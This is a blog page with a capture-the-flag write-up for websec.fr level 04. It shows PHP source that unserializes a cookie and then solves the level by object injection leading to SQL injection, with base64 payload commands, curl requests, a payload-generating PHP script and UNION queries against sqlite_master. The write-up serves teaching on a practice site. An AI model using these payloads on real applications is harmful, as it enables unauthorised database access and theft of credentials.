<!DOCTYPE html>
<html>
<!--
====================================================
       _         _ _ _       _            ___ 
      | |       | (_) |     | |          / __)
  ____| | _   _ | |_| | ____| | _   ____| |__ 
 / _  | || \ / || | | |/ _  | || \ / ___)  __)
( ( | | |_) | (_| | | ( ( | | | | | |   | |   
 \_||_|____/ \____|_|_|\_||_|_| |_|_|   |_|  
 
====================================================
@ABDILAHRF
====================================================
-->
<head>
<meta charset="utf-8">
<title>WEBSEC.FR BABYSTEPS: LEVEL 04 - 1PTS &vert; @ABDILAHRF</title>
<meta name="description" content="Websec.fr Easy: Level 01">
<meta name="keywords" content="hackthebox">

<!-- Twitter Cards -->
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://localhost:4000/images/logo.png">
<meta name="twitter:title" content="Websec.fr babysteps: Level 04 - 1pts">
<meta name="twitter:description" content="Websec.fr Easy: Level 01">
<meta name="twitter:creator" content="@abdilahrf">

<!-- Open Graph -->
<meta property="og:locale" content="en_US">
<meta property="og:type" content="article">
<meta property="og:title" content="Websec.fr babysteps: Level 04 - 1pts">
<meta property="og:description" content="Websec.fr Easy: Level 01">
<meta property="og:url" content="http://localhost:4000/websec.fr/writeup-websecfr-level04">
<meta property="og:site_name" content="@abdilahrf">
<meta property="og:image" content="https://avatars2.githubusercontent.com/u/6015012?v=3&s=460">





<link rel="canonical" href="http://localhost:4000/websec.fr/writeup-websecfr-level04">
<link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="@abdilahrf Feed">
<link rel="author" href="https://plus.google.com/?rel=author">

<!-- http://t.co/dKP3o1e -->
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />


    <link href='http://fonts.googleapis.com/css?family=Montserrat:400,700|Open+Sans:400,600,300,800,700' rel='stylesheet' type='text/css'>
	<link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/font-awesome.min.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/normalize.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/nprogress.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/foundation.min.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/style.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/post.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/code/monokai.css">





<!-- Icons -->
<!-- 16x16 -->
<link rel="shortcut icon" href="http://localhost:4000/favicon.ico">
<!-- 32x32 -->
<link rel="shortcut icon" href="http://localhost:4000/favicon.png">
<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
<link rel="apple-touch-icon-precomposed" href="http://localhost:4000/images/apple-touch-icon-precomposed.png">
<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="http://localhost:4000/images/apple-touch-icon-72x72-precomposed.png">
<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="http://localhost:4000/images/apple-touch-icon-114x114-precomposed.png">
<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/images/apple-touch-icon-144x144-precomposed.png">

<style type="text/css">@media only screen and (min-width:43.75em){.notepad-post-content div>p:first-child:first-letter{float:left;font-size:4.688rem;line-height:4.375rem;padding-top:.25rem;padding-right:.5rem;padding-left:.188rem;font-family:serif}}</style>
</head>
<body class="post-template" itemscope itemtype="http://schema.org/WebPage">  

        <main id="notepad-post-container-simple" class="notepad-post-container-simple" role="main">
            <header class="notepad-post-header-simple">
                <div class="notepad-post-menu-header-simple">

                    <a class="notepad-blog-logo" href="http://localhost:4000">
                        <img src="http://localhost:4000/images/logo.png" alt="Blog Logo" />
                    </a>

                <div class="notepad-blog-menu">      
    <div class="notepad-mobile-menu show-for-small">
        <a href="#"><i class="fa fa-bars"></i></a>
    </div>
    <ul class="notepad-menu">
        <li class="notepad-mobile-close-btn show-for-small text-right">
            <a href="#"><i class="fa fa-times"></i></a>
        </li>

            <li>
                    <a href="http://localhost:4000/">Home</a>
                 </li>

            <li>
                    <a href="http://localhost:4000/featured">Featured Posts</a>
                 </li>

            <li>
                    <a href="http://localhost:4000/categories">Categories</a>
                 </li>

            <li>
                    <a href="http://localhost:4000/about">About</a>
                 </li>
            
           <li><a href="http://localhost:4000/feed.xml" title="Atom/RSS feed"><i class="icon-rss"></i> Feed</a></li>
    </ul>

</div>
            </div>

                <div class="notepad-post-title-simple row">
                    <div class="small-12 columns">
                        <div class="notepad-post-meta-simple">
                            <h1>Websec.fr babysteps: Level 04 - 1pts</h1>
                            <p>by <strong>Abdillah Muhamad</strong> &#8212; on <a href="http://localhost:4000/tags/index.html#hackthebox" data-toggle="tooltip" title="Posts tagged with hackthebox" rel="tag">hackthebox</a> <strong><time datetime="2018-03-22T00:00:00+07:00">22 Mar 2018</time></strong></p>
                        </div>
                    </div>
                </div>
            </header>

        <article class="notepad-post-content post tag-simple">
            <div><h2 id="problem">Problem</h2>
<hr />

<p>Problem URL : https://websec.fr/level04/index.php<br />
Problem Description : Since we’re lazy, we take advantage of php’s garbage collector to properly display query results.
                      We also do like to write neat OOP. You can get the sources here and here.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//source1.php
<span class="cp">&lt;?php</span>
<span class="k">include</span> <span class="s1">'connect.php'</span><span class="p">;</span>

<span class="nv">$sql</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SQL</span><span class="p">();</span>
<span class="nv">$sql</span><span class="o">-&gt;</span><span class="na">connect</span><span class="p">();</span>
<span class="nv">$sql</span><span class="o">-&gt;</span><span class="na">query</span> <span class="o">=</span> <span class="s1">'SELECT username FROM users WHERE id='</span><span class="p">;</span>


<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span> <span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'leet_hax0r'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$sess_data</span> <span class="o">=</span> <span class="nb">unserialize</span> <span class="p">(</span><span class="nb">base64_decode</span> <span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'leet_hax0r'</span><span class="p">]));</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$sess_data</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">])</span> <span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">'CANT HACK US!!!'</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="nv">$e</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$cookie</span> <span class="o">=</span> <span class="nb">base64_encode</span> <span class="p">(</span><span class="nb">serialize</span> <span class="p">(</span><span class="k">array</span> <span class="p">(</span> <span class="s1">'ip'</span> <span class="o">=&gt;</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">])))</span> <span class="p">;</span>
    <span class="nb">setcookie</span> <span class="p">(</span><span class="s1">'leet_hax0r'</span><span class="p">,</span> <span class="nv">$cookie</span><span class="p">,</span> <span class="nb">time</span> <span class="p">()</span> <span class="o">+</span> <span class="p">(</span><span class="mi">86400</span> <span class="o">*</span> <span class="mi">30</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span> <span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_numeric</span> <span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="nv">$sql</span><span class="o">-&gt;</span><span class="na">query</span> <span class="o">.=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
    <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">' Invalid query'</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>

<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
        <span class="nt">&lt;title&gt;</span>#WebSec Level Four<span class="nt">&lt;/title&gt;</span>
        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"../static/bootstrap.min.css"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/head&gt;</span>
        <span class="nt">&lt;body&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"main"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
                                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
                                        <span class="nt">&lt;h1&gt;</span>LevelFour <span class="nt">&lt;small&gt;</span> - Cereal is nation<span class="nt">&lt;/small&gt;&lt;/h1&gt;</span>
                                <span class="nt">&lt;/div&gt;</span>
                                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
                                        <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"lead"</span><span class="nt">&gt;</span>
                        Since we're lazy, we take advantage of php's garbage collector to properly display query results.<span class="nt">&lt;br&gt;</span>
                         We also do like to write neat OOP.
                        You can get the sources <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"source1.php"</span><span class="nt">&gt;</span>here<span class="nt">&lt;/a&gt;</span> and <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"source2.php"</span><span class="nt">&gt;</span>here<span class="nt">&lt;/a&gt;</span>.
                                        <span class="nt">&lt;/p&gt;</span>
                                <span class="nt">&lt;/div&gt;</span>
                        <span class="nt">&lt;/div&gt;</span>
                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;form</span> <span class="na">class=</span><span class="s">"form-inline"</span> <span class="na">method=</span><span class="s">'post'</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">'id'</span> <span class="na">class=</span><span class="s">'form-control'</span> <span class="na">type=</span><span class="s">'text'</span> <span class="na">placeholder=</span><span class="s">'User id'</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;input</span> <span class="na">class=</span><span class="s">"form-control btn btn-default"</span> <span class="na">name=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">'Go'</span> <span class="na">type=</span><span class="s">'submit'</span><span class="nt">&gt;</span>
                                        <span class="nt">&lt;/form&gt;</span>
                                <span class="nt">&lt;/div&gt;</span>
                        <span class="nt">&lt;/div&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//source2.php
<span class="cp">&lt;?php</span>

<span class="k">class</span> <span class="nc">SQL</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$query</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$conn</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">__construct</span><span class="p">()</span> <span class="p">{</span>
    <span class="p">}</span>
    
    <span class="k">public</span> <span class="k">function</span> <span class="nf">connect</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SQLite3</span> <span class="p">(</span><span class="s2">"database.db"</span><span class="p">,</span> <span class="nx">SQLITE3_OPEN_READONLY</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">SQL_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span> <span class="o">=</span> <span class="nv">$query</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">execute</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">conn</span><span class="o">-&gt;</span><span class="na">query</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">__destruct</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">conn</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connect</span> <span class="p">();</span>
        <span class="p">}</span>
        
        <span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">execute</span> <span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="kc">false</span> <span class="o">!==</span> <span class="nv">$ret</span><span class="p">)</span> <span class="p">{</span>    
            <span class="k">while</span> <span class="p">(</span><span class="kc">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$ret</span><span class="o">-&gt;</span><span class="na">fetchArray</span> <span class="p">(</span><span class="nx">SQLITE3_ASSOC</span><span class="p">)))</span> <span class="p">{</span>
                <span class="k">echo</span> <span class="s1">'&lt;p class="well"&gt;&lt;strong&gt;Username:&lt;strong&gt; '</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">.</span> <span class="s1">'&lt;/p&gt;'</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<h2 id="solve">Solve</h2>
<hr />

<p>The problem here our ip address saved in cookie within serialized base64 string,
the cookie named <code class="highlighter-rouge">leet_hax0r</code> , if the cookie is exsist the script trying to unsealized it.</p>

<p>so this vulnerable to PHP Object Injection because the class SQL put his action to query in <code class="highlighter-rouge">__destruct</code> magic php method
that will be called when the object destroyed, so if we create SQL object with unserialize and supliying custom query to <code class="highlighter-rouge">$query</code> variable
we could have sql injection ヽ(・∀・)ﾉ</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo -n 'O:3:"SQL":1:{s:5:"query";s:37:"SELECT username FROM users WHERE id=1";}' |base64
TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzc6IlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPTEiO30=
</code></pre></div></div>

<p>with this serialized object we could check if the custom query we suplied running correctly with this command</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -v https://websec.fr/level04/index.php -H "Cookie: leet_hax0r=TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6Mzc6IlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPTEiO30="

if you see : &lt;strong&gt;Username:&lt;strong&gt; flag&lt;/p&gt;
so that validate the exploit is working
</code></pre></div></div>

<p>now what query we need to build to get the flag? so we need look closely again
 to the <code class="highlighter-rouge">__destruct()</code> function.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     <span class="k">public</span> <span class="k">function</span> <span class="nf">__destruct</span><span class="p">()</span> <span class="p">{</span>
         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">conn</span><span class="p">))</span> <span class="p">{</span>
             <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">connect</span> <span class="p">();</span>
         <span class="p">}</span>
         
         <span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">execute</span> <span class="p">();</span>
         <span class="k">if</span> <span class="p">(</span><span class="kc">false</span> <span class="o">!==</span> <span class="nv">$ret</span><span class="p">)</span> <span class="p">{</span>    
             <span class="k">while</span> <span class="p">(</span><span class="kc">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$ret</span><span class="o">-&gt;</span><span class="na">fetchArray</span> <span class="p">(</span><span class="nx">SQLITE3_ASSOC</span><span class="p">)))</span> <span class="p">{</span>
                 <span class="k">echo</span> <span class="s1">'&lt;p class="well"&gt;&lt;strong&gt;Username:&lt;strong&gt; '</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">.</span> <span class="s1">'&lt;/p&gt;'</span><span class="p">;</span>
             <span class="p">}</span>
         <span class="p">}</span>
     <span class="p">}</span>
</code></pre></div></div>

<p>this function will only output $row[‘username’] and i don’t think the flag in username 
 column so we need to use UNION Query to manipulate this, the column still username but we
 want to extract a password so we construct serialized object with that purposes.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> echo -n 'O:3:"SQL":1:{s:5:"query";s:81:"SELECT username FROM users WHERE id=1 UNION SELECT password from users WHERE id=1";}' |base64
 TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6ODE6IlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPTEgVU5JT04gU0VMRUNUIHBhc3N3b3JkIGZyb20gdXNlcnMgV0hFUkUgaWQ9MSI7fQ==
 
 curl -v https://websec.fr/level04/index.php -H "Cookie: leet_hax0r=TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6ODE6IlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkP
 TEgVU5JT04gU0VMRUNUIHBhc3N3b3JkIGZyb20gdXNlcnMgV0hFUkUgaWQ9MSI7fQ=="
 
 <span class="cp">&lt;!DOCTYPE html&gt;</span>
 <span class="nt">&lt;html&gt;</span>
 <span class="nt">&lt;head&gt;</span>
         <span class="nt">&lt;title&gt;</span>#WebSec Level Four<span class="nt">&lt;/title&gt;</span>
         <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"../static/bootstrap.min.css"</span> <span class="nt">/&gt;</span>
 <span class="nt">&lt;/head&gt;</span>
         <span class="nt">&lt;body&gt;</span>
                 <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"main"</span><span class="nt">&gt;</span>
                         <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
                                 <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
                                         <span class="nt">&lt;h1&gt;</span>LevelFour <span class="nt">&lt;small&gt;</span> - Cereal is nation<span class="nt">&lt;/small&gt;&lt;/h1&gt;</span>
                                 <span class="nt">&lt;/div&gt;</span>
                                 <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
                                         <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"lead"</span><span class="nt">&gt;</span>
                                                 Since we're lazy, we take advantage of php's garbage collector to properly display query results.<span class="nt">&lt;br&gt;</span>
                                                  We also do like to write neat OOP.
                                                 You can get the sources <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"source1.php"</span><span class="nt">&gt;</span>here<span class="nt">&lt;/a&gt;</span> and <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"source2.php"</span><span class="nt">&gt;</span>here<span class="nt">&lt;/a&gt;</span>.
                                         <span class="nt">&lt;/p&gt;</span>
                                 <span class="nt">&lt;/div&gt;</span>
                         <span class="nt">&lt;/div&gt;</span>
                         <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
                                 <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
                                         <span class="nt">&lt;form</span> <span class="na">class=</span><span class="s">"form-inline"</span> <span class="na">method=</span><span class="s">'post'</span><span class="nt">&gt;</span>
                                                 <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">'id'</span> <span class="na">class=</span><span class="s">'form-control'</span> <span class="na">type=</span><span class="s">'text'</span> <span class="na">placeholder=</span><span class="s">'User id'</span><span class="nt">&gt;</span>
                                                 <span class="nt">&lt;input</span> <span class="na">class=</span><span class="s">"form-control btn btn-default"</span> <span class="na">name=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">'Go'</span> <span class="na">type=</span><span class="s">'submit'</span><span class="nt">&gt;</span>
                                         <span class="nt">&lt;/form&gt;</span>
                                 <span class="nt">&lt;/div&gt;</span>
                         <span class="nt">&lt;/div&gt;</span>
                 <span class="nt">&lt;/div&gt;</span>
         <span class="nt">&lt;/body&gt;</span>
 <span class="nt">&lt;/html&gt;</span>
 * Connection #0 to host websec.fr left intact
 <span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"well"</span><span class="nt">&gt;&lt;strong&gt;</span>Username:<span class="nt">&lt;strong&gt;</span> WEBSEC{9abd8e824[REDACTED]bb662769c08500}<span class="nt">&lt;/p&gt;&lt;p</span> <span class="na">class=</span><span class="s">"well"</span><span class="nt">&gt;&lt;strong&gt;</span>Username:<span class="nt">&lt;strong&gt;</span> flag<span class="nt">&lt;/p&gt;</span>#
</code></pre></div></div>

<p>We Got The flag  &lt;(￣︶￣)&gt;</p>

<p><strong>Bonus:</strong> we could use <code class="highlighter-rouge">as</code> too for manipulate the column name to username <code class="highlighter-rouge">select password as username from users where id=1</code></p>

<p>if you lazy to construct the serialized payload manually you can use this and use the base64 as cookie</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="k">class</span> <span class="nc">SQL</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$query</span> <span class="o">=</span> <span class="s1">'SELECT password AS username FROM users WHERE id=1'</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$conn</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">SQL</span><span class="p">()));</span>
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT username FROM users WHERE id=-1 union select group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%'-- - (To find what table is available)
SELECT username FROM users WHERE id=-1 union select sql from sqlite_master where type!='meta' and sql not null and name not like 'sqlite_%' and name='users'-- - (To find what is the table column)
</code></pre></div></div>
</div>
        </article>
        <div class="cf"></div>
        <div class="row text-center">
            <section class="notepad-post-share">
                <a class="twitter-icon" href="https://twitter.com/intent/tweet?text=&quot;Websec.fr babysteps: Level 04 - 1pts&quot;%20http://localhost:4000/websec.fr/writeup-websecfr-level04%20via%20&#64;abdilahrf"
                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" title="Share on Twitter">
                    <i class="fa fa-twitter"></i>
                </a>
                <a class="facebook-icon" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/websec.fr/writeup-websecfr-level04"
                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" title="Share on Facebook">
                    <i class="fa fa-facebook"></i>
                </a>
                <a class="google-icon" href="https://plus.google.com/share?url=http://localhost:4000/websec.fr/writeup-websecfr-level04"
                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;" title="Share on Google+">
                    <i class="fa fa-google-plus"></i>
                </a>
            </section>
        </div>
        <div class="cf"></div>
        
            <div class="notepad-author-info">
                <div class="row">
                    <section class="notepad-post-author small-12 columns">
                        
                            <img src="https://avatars2.githubusercontent.com/u/6015012?v=3&s=460" class="notepad-post-author-avatar" alt="Abdillah Muhamad's photo">
                        
                        
                            <span class="author-label">Author</span>
                            <h1>Abdillah Muhamad</h1>
                        
                        
                            <p><a href="mailto:hasny1337@gmail.com" class="author-website">hasny1337@gmail.com</a></p>
                        
                        
                            <p>Coffe make you like a hero</p>
                        
                    </section>
                </div>
            </div>
 
        
        <div class="cf"></div>
        
        <section class="notepad-disqus row">
    <div class="small-12 columns">
        <h1 class="notepad-comments-header">Comments</h1>
        <div id="disqus_thread"></div>
        <script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'abdilahrf'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function () {
        var s = document.createElement('script'); s.async = true;
        s.type = 'text/javascript';
        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
    }());
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    </div>
</section>

        <div class="cf"></div>

    <footer class="notepad-site-footer">
    <div class="copyright">
         <section>All content copyright <a href="http://localhost:4000/about">Abdillah Muhamad</a> &copy; 2018 &bull; All rights reserved.</section>
         <section>Proudly published with <a class="icon-ghost" href="https://jekyllrb.com/">Jekyll</a></section>
    </div>
    <div class="social-icons">
        
        
        <a href="http://twitter.com/abdilahrf">
            <span class="fa-stack fa-lg">
                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
                <i class="fa fa-twitter fa-stack-1x"></i>
            </span>
        </a>
        
        
        <a href="https://plus.google.com/">
            <span class="fa-stack fa-lg">
                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
                <i class="fa fa-google-plus fa-stack-1x"></i>
            </span>
        </a>
        
        
        
        <a href="http://github.com/abdilahrf">
            <span class="fa-stack fa-lg">
                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
                <i class="fa fa-github fa-stack-1x"></i>
            </span>
        </a>
        
        
        <a href="http://facebook.com/abdilah.jk">
            <span class="fa-stack fa-lg">
                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
                <i class="fa fa-facebook fa-stack-1x"></i>
            </span>
        </a>
        
    </div>
    
    <div class="cf"></div>
</footer> 
</main>    
    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
    <script>window.jQuery || document.write('<script src="http://localhost:4000/assets/js/vendor/jquery-1.11.1.min.js"><\/script>')</script>
    <script src="http://localhost:4000/assets/js/vendor/modernizr.js"></script>
    <script src="http://localhost:4000/assets/js/foundation.min.js"></script>
    
    <script src="http://localhost:4000/assets/js/notepad.js"></script>
    <script src="http://localhost:4000/assets/js/scripts.min.js"></script>
    <script src="http://localhost:4000/assets/js/vendor/nprogress.js"></script>

    <script>
      $(document).foundation();
    </script>
    <script type='text/javascript'>console.log("@abdilahrf");</script>
    <script type='text/javascript'>console.log("https://abdilahrf.me");</script>


<!-- Asynchronous Google Analytics snippet -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-96190645-1', 'auto');
  ga('require', 'displayfeatures');
  ga('send', 'pageview');

</script>

<script>NProgress.start();var interval=setInterval(function(){NProgress.inc()},1000);jQuery(window).load(function(){clearInterval(interval);NProgress.done()});jQuery(window).unload(function(){NProgress.start()});</script>
 
</body>
</html>